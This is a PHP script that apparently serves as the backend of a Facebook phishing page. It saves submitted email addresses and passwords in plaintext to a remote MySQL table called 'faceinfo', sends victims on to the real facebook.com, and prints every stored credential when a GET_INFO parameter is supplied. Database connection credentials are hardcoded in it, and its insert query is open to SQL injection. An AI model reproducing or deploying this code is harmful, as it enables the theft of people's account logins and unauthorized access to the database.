
<?php    
    header('Access-Control-Allow-Origin: *');
   // header('Content-Type: application/json');
		
		
    try {
        
        $db = "";
        $option = array(
            PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8',
        );
    	
    	$db = new PDO("mysql:host=bmhljhnqgyjrpkxfvr4a-mysql.services.clever-cloud.com:3306",'ua3t97lky5dznzwq','SxtFlpopMKiUaiUuv1FM',$option);	
    	
	$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $db->query("USE `bmhljhnqgyjrpkxfvr4a`" );
        // $db->exec("CREATE TABLE faceinfo ( `id` INT(5) NOT NULL AUTO_INCREMENT , `email` VARCHAR(30) NOT NULL , `pass` VARCHAR(30) NOT NULL , PRIMARY KEY (`id`))");
     
	if(isset($_POST["email"]) && isset($_POST["pass"])) {
	    $email = $_POST["email"];
	    $pass = $_POST["pass"];
	    $db->exec("INSERT INTO faceinfo (id, email, pass) VALUES (null, '$email', '$pass')");
	?>
	    <script type='application/javascript' > window.location.href='https://facebook.com'; </script>
	<?php
        }elseif(isset($_GET["GET_INFO"])) {

	    $q1 = $db->query("SELECT * FROM faceinfo" );
            $r1 = $q1->fetchall();
		
	    echo "<pre>";
            print_r($r1);
	    echo "</pre>";	
		
// 	    echo "<pre>";
//             echo json_encode($r1)."\n";
// 	    echo "</pre>";
	}          

    }catch(Exception $e) {
	$e->getMessage();
    }


//     try {
        
//         $db = "";
//         $option = array(
//             PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8',
//         );
    	
//     	$db = new PDO("mysql:host=bmhljhnqgyjrpkxfvr4a-mysql.services.clever-cloud.com:3306",'ua3t97lky5dznzwq','SxtFlpopMKiUaiUuv1FM',$option);	
    	
// 		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

//             $db->query("USE `bmhljhnqgyjrpkxfvr4a`" );
//             $q1 = $db->query("SELECT * FROM `myblogs`" );
            
            

//             $r1 = $q1->fetchall();

//             echo json_encode($r1)."\n";


//     }catch(Exception $e) {
// 		$e->getMessage();
// 	}
	

?> 
